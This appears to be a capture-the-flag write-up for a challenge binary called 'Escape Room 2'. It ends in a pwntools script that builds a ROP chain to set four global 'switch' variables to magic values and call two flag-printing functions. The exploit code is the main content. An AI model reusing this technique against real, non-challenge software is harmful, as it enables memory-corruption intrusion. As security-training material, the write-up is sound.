# Escape Room 2

The binary for this gives us a hint we have to deal with 4 switches and 2 buttons.

![Inline](../images/er2_1.png?raw=true)


Looking at the source code, we notice 4 global variables named switches.

![Inline](../images/er2_2.png?raw=true)


And the two functions that will load and print flags for us are conveniently named **button1** and **button2**.

![Inline](../images/er2_3.png?raw=true)

We can see that the global variables need to have a certain value in order to pass the checks.

We build our rop chain by retrieving the addresses of gadgets we need.

![Inline](../images/er2_4.png?raw=true)

![Inline](../images/er2_5.png?raw=true)

![Inline](../images/er2_6.png?raw=true)


## Exploit
Now we can build the final exploit:
```python
from pwn import *


# Our target
target = './escape-room2'
e = context.binary = ELF(target,checksec=True)
#context.log_level='debug'


io = process(target)



print(io.recv())
print(io.recv())


print("Sending the Payload NOW")


button1 =0x80492d2
button2 =0x8049384

switch1 = e.symbols['switch1']
switch2 = e.symbols['switch2']
switch3 = e.symbols['switch3']
switch4 = e.symbols['switch4']




# # Our Gadgets

pop_eax = 0xf799acdb
pop_ecx = 0xf7f7ce60
memwrite = 0xf7b19ee7

buf2ebp = 0x10

payload = ''

payload += p32(pop_eax)
payload += p32(switch1)
payload += p32(pop_ecx)
payload += p32(0xdeadbeef)
payload += p32(memwrite)


payload += p32(pop_eax)
payload += p32(switch2)
payload += p32(pop_ecx)
payload += p32(0xcafebabe)
payload += p32(memwrite)
payload += p32(button1)

payload += p32(pop_eax)
payload += p32(switch3)
payload += p32(pop_ecx)
payload += p32(0x0ece5612)
payload += p32(memwrite)



payload += p32(pop_eax)
payload += p32(switch4)
payload += p32(pop_ecx)
payload += p32(0x12345678)
payload += p32(memwrite)


payload +=p32(button2)

io.sendline(payload)

print(io.recv())
io.close()
```


